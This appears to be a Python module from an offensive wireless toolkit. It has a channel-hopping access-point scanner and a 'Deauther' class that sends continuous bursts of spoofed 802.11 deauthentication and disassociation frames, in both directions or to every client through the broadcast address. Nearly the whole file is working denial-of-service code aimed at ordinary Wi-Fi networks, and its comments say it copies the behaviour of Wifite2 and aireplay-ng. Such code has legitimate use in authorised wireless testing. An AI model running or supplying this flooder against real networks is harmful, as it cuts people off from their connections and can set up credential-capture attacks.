# ============================================================
#  File: vanta/attacks/deauth.py
#  802.11 deauthentication flood + passive AP scanner.
#  Works on any card that supports monitor mode (Intel included —
#  iwlwifi gets TXFlags=NOSEQ+ORDER, others use plain RadioTap).
# ============================================================
import threading
import subprocess
import time
from typing import Dict, List, Optional

from scapy.all import (  # type: ignore
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, Dot11ProbeResp,
    RadioTap, sniff, sendp,
)

from .base import Attack
from ..core.iface import require_root
from ..core.errors import AttackError
from ..core import wireless


# ================================================================
#  Passive AP scanner
# ================================================================
class ApScanner:
    """
    Sniffs beacons/probe-responses for N seconds across the 2.4/5
    GHz channel plan.  Returns a list of dicts:
        {bssid, ssid, channel, signal_dbm}
    """

    def __init__(self, cfg, logger):
        self.cfg = cfg
        self.log = logger
        self.mon_iface: Optional[str] = None
        self._results: Dict[str, dict] = {}

    def scan(self, seconds: int = 15,
             hop: bool = True) -> List[dict]:
        require_root()
        iface = self.cfg.require_interface()
        if not wireless.is_wireless(iface):
            raise AttackError(f"{iface} is not wireless")

        caps = wireless.check_capabilities(iface)
        if not caps.supports_monitor:
            raise AttackError(
                f"{iface} cannot enter monitor mode: {caps.reason}")

        self.log.ok(f"card: {caps.driver}  ({caps.reason})")
        self.mon_iface = wireless.enable_monitor(iface, self.log)

        self.log.ok(f"scanning for {seconds}s "
                    f"({'hopping' if hop else 'locked ch 6'}) …")
        t0 = time.time()

        stop_hop = threading.Event()

        if hop:
            # Wi-Jam-X uses channels 1-13 only — 2.4GHz — fast dwell
            chans = list(range(1, 14))

            def hopper():
                i = 0
                while not stop_hop.is_set():
                    _run_iw_channel(self.mon_iface,
                                    chans[i % len(chans)])
                    i += 1
                    # Wi-Jam-X uses 0.20s dwell
                    stop_hop.wait(0.20)
            threading.Thread(target=hopper, daemon=True).start()
        else:
            _run_iw_channel(self.mon_iface, 6)

        def handle(pkt):
            if not (pkt.haslayer(Dot11Beacon)
                    or pkt.haslayer(Dot11ProbeResp)):
                return
            bssid = (pkt[Dot11].addr3 or "").lower()
            if not bssid or bssid in self._results:
                return

            ssid, ch = "", "?"
            try:
                if pkt.haslayer(Dot11Beacon):
                    stats = pkt[Dot11Beacon].network_stats()
                    ssid = stats.get("ssid", "")
                    ch = stats.get("channel", "?")
            except Exception:
                pass
            if not ssid and pkt.haslayer(Dot11Elt):
                try:
                    ssid = pkt[Dot11Elt].info.decode(
                        "utf-8", errors="ignore")
                except Exception:
                    pass
            try:
                rssi = getattr(pkt, "dBm_AntSignal", None)
            except Exception:
                rssi = None

            self._results[bssid] = {
                "bssid": bssid,
                "ssid": ssid,
                "channel": ch,
                "signal_dbm": rssi,
            }
            self.log.snare(
                f"AP  {bssid}  ch={ch}  "
                f"rssi={rssi if rssi is not None else '?'}dBm  "
                f"ssid={ssid!r}")

        try:
            sniff(iface=self.mon_iface, prn=handle, store=False,
                  timeout=seconds)
        finally:
            stop_hop.set()
            self.log.info("restoring card …")
            wireless.reset_wifi_card(iface, self.log)

        return sorted(self._results.values(),
                      key=lambda r: -(r["signal_dbm"] or -100))

def _run_iw_channel(iface: str, channel: int):
    """Raw iw channel set — matches Wi-Jam-X exactly."""
    subprocess.run(
        ["iw", iface, "set", "channel", str(channel)],
        capture_output=True, timeout=2)

# ================================================================
#  Deauth flood
# ================================================================
class Deauther(Attack):
    """
    Deauth attack modeled on Wifite2's ScapyDeauth:
      • Plain RadioTap() — no TXFlags hacks
      • Bursts of 5 packets per cycle
      • Cycles through reason codes 3, 7, 1 (mimics aireplay-ng)
      • Sends bidirectional deauth (AP→Client AND Client→AP)
      • Also sends disassociation frames
    """

    NAME = "deauth"

    DEFAULT_REASONS = [3, 7, 1]   # leaving, class-3, unspecified

    def __init__(self, cfg, logger,
                 bssid: str,
                 client: Optional[str] = None,
                 channel: Optional[int] = None,
                 count: int = 0,
                 reason: Optional[int] = None):
        super().__init__(cfg, logger)
        self.bssid   = (bssid or "").lower()
        self.client  = (client or "ff:ff:ff:ff:ff:ff").lower()
        self.channel = channel
        self.count   = count
        self.reason  = reason
        self.mon_iface: Optional[str] = None

    def setup(self):
        require_root()
        iface = self.cfg.require_interface()

        if not wireless.is_wireless(iface):
            raise AttackError(f"{iface} is not a wireless interface.")

        if not self.bssid or len(self.bssid.split(":")) != 6:
            raise AttackError("deauth requires a valid BSSID — scan first.")

        caps = wireless.check_capabilities(iface)
        if not caps.supports_monitor:
            raise AttackError(
                f"{iface}: monitor mode not supported ({caps.reason})")

        self.log.ok(f"card: {caps.driver}")
        self.mon_iface = wireless.enable_monitor(iface, self.log)

        if self.channel:
            if wireless.set_channel(self.mon_iface, int(self.channel)):
                self.log.ok(f"locked to channel {self.channel}")

    def _build_burst(self) -> list:
        """
        Build a burst of deauth + disassoc frames, exactly like
        Wifite2's ScapyDeauth.deauth().
        """
        from scapy.all import Dot11Disas
        packets = []
        reasons = ([self.reason] if self.reason
                   else self.DEFAULT_REASONS)

        target = self.client if self.client != "ff:ff:ff:ff:ff:ff" \
            else "ff:ff:ff:ff:ff:ff"

        for i in range(5):   # burst of 5
            rc = reasons[i % len(reasons)]

            # ---- AP → Client ----
            packets.append(
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=target, addr2=self.bssid,
                      addr3=self.bssid) /
                Dot11Deauth(reason=rc)
            )

            # ---- Client → AP (spoofed) ----
            if target != "ff:ff:ff:ff:ff:ff":
                packets.append(
                    RadioTap() /
                    Dot11(type=0, subtype=12,
                          addr1=self.bssid, addr2=target,
                          addr3=self.bssid) /
                    Dot11Deauth(reason=rc)
                )

            # ---- Disassociation AP → Client ----
            packets.append(
                RadioTap() /
                Dot11(type=0, subtype=10,
                      addr1=target, addr2=self.bssid,
                      addr3=self.bssid) /
                Dot11Disas(reason=rc)
            )
        return packets

    def _run(self):
        bursts = 0
        total = 0
        t0 = time.time()

        self.log.ok(f"deauth  bssid={self.bssid}  "
                    f"client={self.client}")

        while not self._stop.is_set():
            try:
                pkts = self._build_burst()
                sendp(pkts, iface=self.mon_iface, verbose=False)
                bursts += 1
                total += len(pkts)
                self.stats["frames_sent"] = total
                self.stats["bursts_sent"] = bursts
                self.stats["rate"] = round(
                    total / max(time.time() - t0, 1), 1)
                if bursts % 5 == 0:
                    self.log.info(
                        f"deauth: {total} frames "
                        f"({self.stats['rate']}/s)")

                if self.count and total >= self.count:
                    self.log.ok(f"deauth: sent {total}, done.")
                    break
            except Exception as e:
                self.log.warn(f"deauth send error: {e}")
                self._stop.wait(0.5)
                continue
            # Wifite2 uses 0.5s between bursts
            self._stop.wait(0.5)

    def teardown(self):
        if self.mon_iface:
            self.log.info("resetting wifi card …")
            wireless.reset_wifi_card(self.cfg.iface, self.log)
            self.mon_iface = None
